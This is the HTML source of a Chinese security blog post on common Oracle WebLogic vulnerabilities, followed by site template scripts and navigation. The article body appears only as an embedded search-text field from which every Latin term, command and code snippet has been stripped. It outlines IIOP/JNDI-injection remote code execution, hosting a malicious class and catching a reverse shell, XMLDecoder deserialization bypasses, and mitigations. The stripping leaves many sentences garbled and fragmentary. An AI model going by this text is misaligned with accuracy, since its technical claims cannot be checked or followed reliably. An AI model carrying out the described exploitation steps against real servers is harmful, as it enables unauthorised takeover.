关于漏洞核心原理的深度解析结合多个技术分析来源总结其攻击路径触发机制及修复方案漏洞背景与影响是中的一个高危远程代码执行漏洞允许未经身份验证的攻击者通过协议远程接管服务器该漏洞利用核心组件的反序列化机制缺陷结合注入实现任意代码执行影响版本核心原理分析漏洞触发机制漏洞的核心在于对协议的远程对象绑定和反序列化逻辑存在缺陷具体流程如下远程对象绑定攻击者通过协议将恶意对象绑定到服务端该对象需继承自接口操作触发当服务端通过方法访问绑定的远程对象时会调用其方法注入在类的方法中存在以下关键代码其中参数由攻击者控制可指向恶意服务地址触发注入远程类加载与代码执行通过注入加载远程恶意类如利用协议触发反序列化或动态类加载最终执行任意系统命令关键组件缺陷协议支持协议默认开放且允许远程绑定对象未对绑定内容进行严格校验黑名单绕过的反序列化黑名单未覆盖类及其依赖的上下文机制输入验证缺失未对参数进行合法性检查导致攻击者可注入任意地址漏洞利用链典型攻击步骤构造恶意对象生成继承自的远程对象设置为攻击者控制的服务地址绑定对象至服务端通过协议将恶意对象发送至目标服务器触发操作诱导服务端调用方法访问该对象触发方法中的注入加载远程恶意类服务端通过协议下载并加载攻击者提供的恶意类如或执行系统命令工具依赖用于搭建恶意服务托管恶意类文件并生成反向载荷工具自动化生成攻击请求指定目标端口及恶意地址漏洞利用方式一使用自动化工具编写恶意类并编译编译命令服务公开恶意类启动服务在攻击机上运行监听服务并托管恶意类端口监听下载并的执行攻击命令获取反弹成功执行后攻击机的监听端口将接收到目标服务器的连接实现远程控制方式二手动编写构造恶意对象利用类注入可控的触发注入示例代码简化攻击机恶意对象名称恶意对象名称触发漏洞关键点通过反射修改和字段指向攻击者控制的服务托管恶意类文件在的服务路径下放置恶意或类文件如通过服务动态加载触发漏洞运行代码目标服务器将向攻击机的服务发起请求加载并执行恶意代码修复与缓解措施官方补丁通过以下方式修复漏洞黑名单更新将及相关危险类加入反序列化黑名单协议限制增强协议的安全性校验限制未授权绑定操作临时缓解方案禁用协议通过控制台关闭协议使用连接筛选器限制协议访问来源网络隔离限制管理端口的访问范围避免暴露于公网升级使用版本以限制远程类加载能力总结与启示的本质是对协议的安全控制不足结合注入机制实现远程代码执行其危害性在于攻击链简单且无需身份验证成为勒索软件和组织的重点目标防御建议定期更新官方补丁关注季度安全通告强化协议管控遵循最小化开放原则部署入侵检测系统监控异常流量如高频请求综合利用中间件扫描服务信息收集使用扫描协议是否可用综合利用工具工具下载就目前而言就这个工具最好用利用示例使用启动工具四月下午协议探测直接点击协议探测探测时候开启或者在地址栏下方输入想要探测的即可漏洞检查首先配置我们确定的服务的路径漏洞检查选择直接扫描所有可用点击检查按钮检查完后可直接在界面上看到检查结果例如此次显示可用命令执行工具支持的漏洞编号如果通过工具无法探测到可利用的漏洞可再通过探测的版本在公开漏洞库中进行搜索然后进行利用未授权访问协议和协议对比以下是协议与协议的对比分析涵盖协议设计功能特性安全风险及适用场景等核心维度协议概述维度协议协议定义私有协议基于优化专为集群通信设计标准协议通用对象请求代理架构支持跨语言跨平台的分布式通信核心目标提供高性能的对象传输和集群管理功能实现跨语言互操作性如等依赖技术序列化机制私有扩展如负载均衡心跳检测的通用协议规范结合序列化和接口定义语言核心特性对比特性协议协议序列化机制基于原生序列化支持复杂对象传输如类方法状态使用序列化格式需通过定义接口对非语言更友好性能优化高度优化压缩传输数据长连接复用支持异步通信通用性强但性能较低数据包解析开销大跨语言兼容性牺牲了效率集群支持深度集成集群功能自动故障转移负载均衡会话复制依赖的对象请求代理实现分布式通信无原生集群管理能力跨语言支持仅限强绑定生态支持多语言通过生成不同语言的客户端和服务端安全性对比维度协议协议主要风险反序列化漏洞高发如协议默认使用原生序列化攻击者可构造恶意对象绕过黑名单风险较低但依然存在安全机制如可增强认证但实现复杂易配置错误加密支持支持基于加密支持加密的攻击面更广泛默认开启端口且公网暴露风险高较窄多用于内部系统集成公网暴露较少典型漏洞案例协议漏洞示例利用方式反序列化漏洞补丁绕过发送恶意序列化数据通过或链执行任意代码反序列化漏洞权限绕过利用协议传输恶意对象触发服务端反序列化或绕过权限控制适用场景场景协议协议纯环境首选集群内部节点通信客户端与服务器交互不推荐性能低于无额外优势跨语言系统不可用仅支持生态首选集成遗留系统如服务多语言微服务通信高并发需求更优长连接复用数据压缩降低延迟较差协议解析和跨语言转换带来额外开销配置与加固建议措施协议协议禁用协议若非必要关闭端口关闭端口加密通信强制使用替代启用并配置证书输入过滤拦截包含危险类的序列化数据如限制接口的访问权限校验定义的数据格式总结协议专为设计的高性能协议反序列化漏洞高发需严格限制公网暴露协议面向跨语言集成的标准协议风险相对可控但需注意安全配置共同防御重点禁用非必要协议启用加密传输监控反序列化行为漏洞总结组件相关类型反序列化漏洞组件相关影响版本原理漏洞源于的组件未对用户传入的数据进行过滤攻击者可构造包含标签的恶意数据触发反序列化执行任意命令修复措施官方通过黑名单机制过滤标签但该补丁存在绕过可能类型反序列化补丁绕过漏洞影响版本与相同原理的补丁仅过滤了标签攻击者改用等标签构造新的载荷绕过黑名单限制再次触发反序列化漏洞利用路径通过等接口发送恶意请求执行命令或上传修复措施进一步扩展黑名单限制更多危险标签并删除组件类型反序列化二次补丁绕过漏洞影响版本原理攻击者通过属性构造特定节点如绕过的补丁限制再次触发反序列化漏洞关联协议利用场景类似但需构造更复杂的载荷绕过补丁检查类型反序列化漏洞组件相关影响版本原理攻击者通过组件的接口发送恶意数据利用未过滤的反序列化路径执行命令属于的变种修复措施彻底移除或禁用相关组件并升级至安全版本其他常见漏洞分类总结反序列化漏洞核心原因在处理协议的反序列化数据时未严格校验输入数据导致恶意对象被解析并触发代码执行典型漏洞首个公开的反序列化漏洞利用链实现通过反序列化绕过补丁触发远程代码执行组件反序列化漏洞影响和版本基于协议的反序列化漏洞利用类绕过黑名单利用方式构造恶意序列化数据通过协议发送至目标端口默认未授权访问权限绕过核心原因身份验证逻辑缺陷或路径遍历漏洞允许攻击者绕过登录验证直接访问敏感功能典型漏洞未授权访问管理控制台通过构造特殊绕过认证如利用方式直接访问隐藏接口或通过路径遍历访问受限功能如部署文件权限提升漏洞结合实现未授权文件上传漏洞核心原因未对上传文件的路径类型和权限进行校验导致恶意文件被写入可执行目录典型漏洞通过修改工作目录上传至路径利用未授权上传配置文件导致代码执行利用方式利用管理界面功能如安全选项上传恶意文件并通过访问触发服务器端请求伪造核心原因服务端未校验用户提供的允许攻击者探测内网或发起二次攻击典型漏洞通过发起内网请求利用方式构造恶意参数利用服务作为代理访问内部系统远程代码执行核心原因多种漏洞组合利用如反序列化权限绕过或直接代码注入典型漏洞通过未授权接口触发远程代码执行组件的反序列化漏洞通过触发利用方式结合反序列化链或直接部署恶意应用如文件配置错误核心原因默认弱口令未禁用高风险服务或开放敏感端口典型问题默认凭据等弱口令未修改协议暴露未限制协议访问导致反序列化攻击面扩大调试模式开启生产环境中启用开发模式功能如服务测试页利用方式暴力破解密码利用未关闭的服务发起攻击信息泄露核心原因接口或日志暴露敏感信息如版本号配置详情典型漏洞通过错误页面泄露服务器路径信息日志文件未保护访问日志配置文件未加密存储利用方式通过错误信息或公开接口获取版本信息辅助后续漏洞利用防御建议及时更新补丁关注季度关键补丁更新修复已知漏洞禁用高风险协议修改禁用强化访问控制限制管理控制台的访问启用多因素认证和强密码策略最小化服务暴露关闭不必要的服务如避免将管理端口暴露在公网日志与监控实时监控异常请求如大量反序列化流量定期审计日志文件汇总归类不可出网利用基于协议系列基于协议未授权绕过系列基于文件上传的基于的链变种可出网利用基于的注入基于的注入',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2025-05-22 20:29:38',
  postMainColor: '',
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#18171d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#f7f9fe')
        }
      }
      const t = saveToLocal.get('theme')
    
          const now = new Date()
          const hour = now.getHours()
          const isNight = hour <= 8 || hour >= 22
          if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
          else if (t === 'light') activateLightMode()
          else activateDarkMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><meta name="generator" content="Hexo 7.3.0"></head><body data-type="anzhiyu"><div id="web_bg"></div><div id="an_music_bg"></div><div id="loading-box" onclick="document.getElementById(&quot;loading-box&quot;).classList.add(&quot;loaded&quot;)"><div class="loading-bg"><img class="loading-img nolazyload" alt="加载头像" src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/avtor.png?x-oss-process=style/img-to-webp"/><div class="loading-image-dot"></div></div></div><script>const preloader = {
  endLoading: () => {
    document.getElementById('loading-box').classList.add("loaded");
  },
  initLoading: () => {
    document.getElementById('loading-box').classList.remove("loaded")
  }
}
window.addEventListener('load',()=> { preloader.endLoading() })
setTimeout(function(){preloader.endLoading();},10000)

if (true) {
  document.addEventListener('pjax:send', () => { preloader.initLoading() })
  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
}</script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.10/progress_bar/progress_bar.css"/><script async="async" src="https://cdn.cbd.int/pace-js@1.2.4/pace.min.js" data-pace-options="{ &quot;restartOnRequestAfter&quot;:false,&quot;eventLag&quot;:false}"></script><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><div id="nav-group"><span id="blog_name"><a id="site-name" href="/" accesskey="h"><div class="title">高木のBlog</div><i class="anzhiyufont anzhiyu-icon-house-chimney"></i></a><div id="he-plugin-simple"></div><script>var WIDGET = {
  "CONFIG": {
    "modules": "0124",
    "background": "2",
    "tmpColor": "FFFFFF",
    "tmpSize": "16",
    "cityColor": "FFFFFF",
    "citySize": "16",
    "aqiColor": "E8D87B",
    "aqiSize": "16",
    "weatherIconSize": "24",
    "alertIconSize": "18",
    "padding": "10px 10px 10px 10px",
    "shadow": "0",
    "language": "auto",
    "borderRadius": "20",
    "fixed": "true",
    "vertical": "top",
    "horizontal": "left",
    "left": "10",
    "top": "7.1",
    "key": "df245676fb434a0691ead1c63341cd94"
  }
}
</script><link rel="stylesheet" href="https://widget.qweather.net/simple/static/css/he-simple.css?v=1.4.0"/><script src="https://widget.qweather.net/simple/static/js/he-simple.js?v=1.4.0"></script></span><div class="mask-name-container"><div id="name-container"><a id="page-name" href="javascript:anzhiyu.scrollToDest(0, 500)">PAGE_NAME</a></div></div><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><i class="anzhiyufont anzhiyu-icon-box-archive faa-tada" style="font-size: 0.9em;"></i><span> 隧道</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><i class="anzhiyufont anzhiyu-icon-shapes faa-tada" style="font-size: 0.9em;"></i><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags faa-tada" style="font-size: 0.9em;"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><i class="anzhiyufont anzhiyu-icon-link faa-tada" style="font-size: 0.9em;"></i><span> 友人帐</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/comments/"><i class="anzhiyufont anzhiyu-icon-envelope faa-tada" style="font-size: 0.9em;"></i><span> 留言板</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/music/"><i class="anzhiyufont anzhiyu-icon-music faa-tada" style="font-size: 0.9em;"></i><span> 音乐馆</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/bangumis/"><i class="anzhiyufont anzhiyu-icon-bilibili faa-tada" style="font-size: 0.9em;"></i><span> 追番页</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><i class="anzhiyufont anzhiyu-icon-paper-plane faa-tada" style="font-size: 0.9em;"></i><span> 关于本人</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/essay/"><i class="anzhiyufont anzhiyu-icon-lightbulb faa-tada" style="font-size: 0.9em;"></i><span> 站点动态</span></a></li><li><a class="site-page child faa-parent animated-hover" href="javascript:toRandomPost()"><i class="anzhiyufont anzhiyu-icon-shoe-prints1 faa-tada" style="font-size: 0.9em;"></i><span> 随便逛逛</span></a></li></ul></div></div></div><div id="nav-right"><div class="nav-button only-home" id="travellings_button" title="随机前往一个开往项目网站"><a class="site-page" onclick="anzhiyu.totraveling()" title="随机前往一个开往项目网站" href="javascript:void(0);" rel="external nofollow" data-pjax-state="external"><i class="anzhiyufont anzhiyu-icon-train"></i></a></div><div class="nav-button" id="randomPost_button"><a class="site-page" onclick="toRandomPost()" title="随机前往一个文章" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-dice"></i></a></div><div class="nav-button" id="search-button"><a class="site-page social-icon search" href="javascript:void(0);" title="搜索🔍" accesskey="s"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span> 搜索</span></a></div><input id="center-console" type="checkbox"/><label class="widget" for="center-console" title="中控台" onclick="anzhiyu.switchConsole();"><i class="left"></i><i class="widget center"></i><i class="widget right"></i></label><div id="console"><div class="console-card-group-reward"><ul class="reward-all console-card"><li class="reward-item"><a href="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/red_cross.png?x-oss-process=style/img-to-webp" target="_blank"><img class="post-qr-code-img" alt="红十字会" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/red_cross.png?x-oss-process=style/img-to-webp"/></a><div class="post-qr-code-desc">红十字会</div></li><li class="reward-item"><a href="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/logo.png?x-oss-process=style/img-to-webp" target="_blank"><img class="post-qr-code-img" alt="LOGO" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/logo.png?x-oss-process=style/img-to-webp"/></a><div class="post-qr-code-desc">LOGO</div></li></ul></div><div class="console-card-group"><div class="console-card-group-left"><div class="console-card" id="card-newest-comments"><div class="card-content"><div class="author-content-item-tips">互动</div><span class="author-content-item-title"> 最新评论</span></div><div class="aside-list"><span>正在加载中...</span></div></div></div><div class="console-card-group-right"><div class="console-card tags"><div class="card-content"><div class="author-content-item-tips">兴趣点</div><span class="author-content-item-title">寻找你感兴趣的领域</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/AI%E8%AF%AD%E8%A8%80%E5%A4%A7%E6%A8%A1%E5%9E%8B/" style="font-size: 1.05rem;">AI语言大模型<sup>1</sup></a><a href="/tags/APK/" style="font-size: 1.05rem;">APK<sup>2</sup></a><a href="/tags/Android/" style="font-size: 1.05rem;">Android<sup>1</sup></a><a href="/tags/CVE/" style="font-size: 1.05rem;">CVE<sup>5</sup></a><a href="/tags/Chrome/" style="font-size: 1.05rem;">Chrome<sup>2</sup></a><a href="/tags/IPV6/" style="font-size: 1.05rem;">IPV6<sup>1</sup></a><a href="/tags/JAVA/" style="font-size: 1.05rem;">JAVA<sup>6</sup></a><a href="/tags/JS%E9%80%86%E5%90%91/" style="font-size: 1.05rem;">JS逆向<sup>2</sup></a><a href="/tags/LLM/" style="font-size: 1.05rem;">LLM<sup>1</sup></a><a href="/tags/NAS/" style="font-size: 1.05rem;">NAS<sup>3</sup></a><a href="/tags/PHP/" style="font-size: 1.05rem;">PHP<sup>2</sup></a><a href="/tags/Prompt/" style="font-size: 1.05rem;">Prompt<sup>1</sup></a><a href="/tags/RCE/" style="font-size: 1.05rem;">RCE<sup>19</sup></a><a href="/tags/TLS/" style="font-size: 1.05rem;">TLS<sup>1</sup></a><a href="/tags/cisp/" style="font-size: 1.05rem;">cisp<sup>2</sup></a><a href="/tags/draft/" style="font-size: 1.05rem;">draft<sup>5</sup></a><a href="/tags/esxi/" style="font-size: 1.05rem;">esxi<sup>1</sup></a><a href="/tags/hexo/" style="font-size: 1.05rem;">hexo<sup>1</sup></a><a href="/tags/html/" style="font-size: 1.05rem;">html<sup>1</sup></a><a href="/tags/javascript/" style="font-size: 1.05rem;">javascript<sup>1</sup></a><a href="/tags/nas/" style="font-size: 1.05rem;">nas<sup>1</sup></a><a href="/tags/%E4%B8%AD%E9%97%B4%E4%BB%B6/" style="font-size: 1.05rem;">中间件<sup>15</sup></a><a href="/tags/%E4%BA%91%E5%AD%98%E5%82%A8/" style="font-size: 1.05rem;">云存储<sup>1</sup></a><a href="/tags/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD/" style="font-size: 1.05rem;">人工智能<sup>2</sup></a><a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 1.05rem;">代码审计<sup>16</sup></a><a href="/tags/%E5%8D%9A%E5%AE%A2/" style="font-size: 1.05rem;">博客<sup>1</sup></a><a href="/tags/%E5%AE%9E%E9%AA%8C/" style="font-size: 1.05rem;">实验<sup>1</sup></a><a href="/tags/%E5%AF%86%E7%A0%81/" style="font-size: 1.05rem;">密码<sup>8</sup></a><a href="/tags/%E6%8F%90%E7%A4%BA%E8%AF%8D/" style="font-size: 1.05rem;">提示词<sup>1</sup></a><a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" style="font-size: 1.05rem;">渗透测试<sup>22</sup></a><a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" style="font-size: 1.05rem;">漏洞复现<sup>22</sup></a><a href="/tags/%E7%A1%AC%E7%9B%98/" style="font-size: 1.05rem;">硬盘<sup>1</sup></a><a href="/tags/%E7%A7%81%E6%9C%89%E4%BA%91/" style="font-size: 1.05rem;">私有云<sup>1</sup></a><a href="/tags/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/" style="font-size: 1.05rem;">网络协议<sup>2</sup></a><a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="font-size: 1.05rem;">网络安全<sup>10</sup></a><a href="/tags/%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE/" style="font-size: 1.05rem;">网络配置<sup>1</sup></a><a href="/tags/%E8%AF%81%E4%B9%A6/" style="font-size: 1.05rem;">证书<sup>1</sup></a><a href="/tags/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/" style="font-size: 1.05rem;">软件开发<sup>1</sup></a><a href="/tags/%E9%99%90%E5%88%B6%E7%BB%95%E8%BF%87/" style="font-size: 1.05rem;">限制绕过<sup>1</sup></a><a href="/tags/%E9%9D%B6%E5%9C%BA/" style="font-size: 1.05rem;">靶场<sup>3</sup></a></div></div><hr/></div></div><div class="console-card history"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-box-archiv"></i><span>文章</span></div><div class="card-archives"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-archive"></i><span>归档</span><a class="card-more-btn" href="/archives/" title="查看更多">
    <i class="anzhiyufont anzhiyu-icon-angle-right"></i></a></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2025/06/"><span class="card-archive-list-date">六月 2025</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">4</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2025/05/"><span class="card-archive-list-date">五月 2025</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">4</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2025/03/"><span class="card-archive-list-date">三月 2025</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">11</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2025/02/"><span class="card-archive-list-date">二月 2025</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">2</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2025/01/"><span class="card-archive-list-date">一月 2025</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">3</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/11/"><span class="card-archive-list-date">十一月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">1</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/10/"><span class="card-archive-list-date">十月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">2</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/09/"><span class="card-archive-list-date">九月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">1</span><span>篇</span></div></a></li></ul></div><hr/></div></div></div><div class="button-group"><div class="console-btn-item"><a class="darkmode_switchbutton" title="显示模式切换" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-moon"></i></a></div><div class="console-btn-item" id="consoleHideAside" onclick="anzhiyu.hideAsideBtn()" title="边栏显示控制"><a class="asideSwitch"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></a></div><div class="console-btn-item" id="consoleMusic" onclick="anzhiyu.musicToggle()" title="音乐开关"><a class="music-switch"><i class="anzhiyufont anzhiyu-icon-music"></i></a></div></div><div class="console-mask" onclick="anzhiyu.hideConsole()" href="javascript:void(0);"></div></div><div class="nav-button" id="nav-totop"><a class="totopbtn" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i><span id="percent" onclick="anzhiyu.scrollToDest(0,500)">0</span></a></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);" title="切换"><i class="anzhiyufont anzhiyu-icon-bars"></i></a></div></div></div></nav><div id="post-info"><div id="post-firstinfo"><div class="meta-firstline"><a class="post-meta-original">原创</a><span class="post-meta-categories"><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-inbox post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" itemprop="url">网络安全</a></span><span class="article-meta tags"><a class="article-meta__tags" href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>漏洞复现</span></a><a class="article-meta__tags" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>渗透测试</span></a><a class="article-meta__tags" href="/tags/%E4%B8%AD%E9%97%B4%E4%BB%B6/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>中间件</span></a><a class="article-meta__tags" href="/tags/java/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>java</span></a><a class="article-meta__tags" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>反序列化</span></a></span></div></div><h1 class="post-title" itemprop="name headline">Weblogic常见安全漏洞</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="anzhiyufont anzhiyu-icon-calendar-days post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" itemprop="dateCreated datePublished" datetime="2025-03-29T16:00:00.000Z" title="发表于 2025-03-30 00:00:00">2025-03-30</time><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-history post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" itemprop="dateCreated datePublished" datetime="2025-05-22T12:29:38.748Z" title="更新于 2025-05-22 20:29:38">2025-05-22</time></span></div><div class="meta-secondline"><span class="post-meta-separator"></span><span class="post-meta-wordcount"><i class="anzhiyufont anzhiyu-icon-file-word post-meta-icon" title="文章字数"></i><span class="post-meta-label" title="文章字数">字数总计:</span><span class="word-count" title="文章字数">17k</span><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-clock post-meta-icon" title="阅读时长"></i><span class="post-meta-label" title="阅读时长">阅读时长:</span><span>65分钟</span></span><span class="post-meta-separator"></span><span class="post-meta-pv-cv" id="" data-flag-title="Weblogic常见安全漏洞"><i class="anzhiyufont anzhiyu-icon-fw-eye post-meta-icon"></i><span class="post-meta-label" title="阅读量">阅读量:</span><span id="busuanzi_value_page_pv"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-spin"></i></span></span><span class="post-meta-separator">       </span><span class="post-meta-position" title="作者IP属地为长安"><i class="anzhiyufont anzhiyu-icon-location-dot"></i>长安</span></div></div></div><section class="main-hero-waves-area waves-area"><svg class="waves-svg" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M -160 44 c 30 0 58 -18 88 -18 s 58 18 88 18 s 58 -18 88 -18 s 58 18 88 18 v 44 h -352 Z"></path></defs><g class="parallax"><use href="#gentle-wave" x="48" y="0"></use><use href="#gentle-wave" x="48" y="3"></use><use href="#gentle-wave" x="48" y="5"></use><use href="#gentle-wave" x="48" y="7"></use></g></svg></section><div id="post-top-cover"><img class="nolazyload" id="post-top-bg" src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/oracle-weblogic.png?x-oss-process=style/img-to-webp"></div></header><main id="blog-container"><div class="layout" id="content-inner"><div id="post"><div class="post-ai-description"><div class="ai-title"><i class="anzhiyufont anzhiyu-icon-bilibili"></i><div class="ai-title-text">AI-摘要</div><i class="anzhiyufont anzhiyu-icon-arrow-rotate-right"></i><i class="anzhiyufont anzhiyu-icon-circle-dot" title="朗读摘要"></i><div id="ai-tag">GPT-4.0-turbo GPT</div></div><div class="ai-explanation">AI初始化中...</div><div class="ai-btn-box"><div class="ai-btn-item">介绍自己 🙈</div><div class="ai-btn-item">生成本文简介 👋</div><div class="ai-btn-item">推荐相关文章 📖</div><div class="ai-btn-item">前往主页 🏠</div><div class="ai-btn-item" id="go-tianli-blog">前往爱发电购买</div></div><script data-pjax src="/js/anzhiyu/ai_abstract.js"></script></div><article class="post-content" id="article-container" itemscope itemtype="https://blog.takake.com/posts/64101/"><header><a class="post-meta-categories" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" itemprop="url">网络安全</a><a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" tabindex="-1" itemprop="url">漏洞复现</a><a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" tabindex="-1" itemprop="url">渗透测试</a><a href="/tags/%E4%B8%AD%E9%97%B4%E4%BB%B6/" tabindex="-1" itemprop="url">中间件</a><a href="/tags/java/" tabindex="-1" itemprop="url">java</a><a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" tabindex="-1" itemprop="url">反序列化</a><h1 id="CrawlerTitle" itemprop="name headline">Weblogic常见安全漏洞</h1><span itemprop="author" itemscope itemtype="http://schema.org/Person">Takake</span><time 